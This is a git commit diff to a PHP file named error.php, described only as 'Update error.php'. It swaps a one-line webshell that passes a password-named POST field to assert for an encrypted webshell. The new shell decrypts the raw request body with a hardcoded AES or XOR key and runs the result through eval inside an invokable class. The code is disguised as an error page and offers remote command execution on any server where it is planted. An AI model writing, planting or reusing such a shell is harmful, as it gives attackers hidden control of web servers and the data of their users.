305ab787da6e67260e31d56a5557196105174a0e
momika233 <56291820+momika233@users.noreply.github.com>
2023-04-10 18:43:04 +0800

    Update error.php

--- error.php
+++ error.php
@@ -1,5 +1,25 @@
- <?php
-	$a = "assert";
-	$a($_POST['Abcd@1234']);
-?>
+<?php
+@error_reporting(1);
+session_start();
+$key="0b3bc9ce555f07d1";
+$_SESSION['k']=$key;
+$post=file_get_contents("php://input");
+if(!extension_loaded('openssl'))
+{
+    $t="base64_"."decode";
+    $post=$t($post."");
 
+    for($i=0;$i<strlen($post);$i++) {
+             $post[$i] = $post[$i]^$key[$i+1&15];
+        }
+}
+else
+{
+    $post=openssl_decrypt($post, "AES128", $key);
+}
+$arr=explode('|',$post);
+$func=$arr[0];
+$params=$arr[1];
+class C{public function __invoke($p) {eval($p."");}}
+@call_user_func(new C(),$params);
+?>
